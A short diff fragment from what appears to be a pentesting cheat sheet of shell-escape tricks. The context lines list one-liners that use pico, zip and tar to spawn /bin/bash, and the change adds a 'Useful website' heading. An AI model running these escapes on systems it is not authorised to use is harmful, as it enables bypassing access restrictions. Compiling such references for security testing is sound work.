@@ -76,3 +76,4 @@ pico > pico -s "/bin/bash" then you can write /bin/bash and then CTRL + T
 zip > zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
 tar > tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
 ```
+### Useful website
